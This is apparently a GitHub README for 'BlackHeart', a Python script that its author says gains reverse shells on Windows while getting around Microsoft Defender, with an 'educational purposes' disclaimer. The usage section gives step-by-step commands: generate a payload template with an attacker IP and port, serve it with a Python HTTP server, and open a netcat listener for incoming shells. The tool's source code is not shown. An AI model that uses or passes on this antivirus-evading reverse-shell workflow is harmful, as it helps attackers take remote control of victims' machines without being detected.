# BlackHeart
<img src="https://img.shields.io/badge/-Linux-black?style=for-the-badge&logo=Linux&logoColor=white"> <img src="https://img.shields.io/badge/-Python-black?style=for-the-badge&logo=python&logoColor=white"><br>

BlackHeart is a simple python script to demonstrate reverse shell gaining without Microsoft Defender restrictions. (FOR EDUCATIONAL PURPOSES!!)

# Setup
You can use simply the following command<br>
```bash
pip3 install -r requirements.txt
```

# Usage
- First of all you have to generate a template for your shell.
```bash
python3 blackheart.py --lhost YOUR_IP --lport YOUR_PORT
```

- Then you have to open a simple http server to serve your template.
```bash
python3 -m http.server
```

- And you need to open a listener port to listen incoming connections.
```bash
nc -lvp 4545
```

# PoC
![animation](https://user-images.githubusercontent.com/42123683/187213124-dfadfa31-2afe-4016-961a-eddea6726500.mp4)
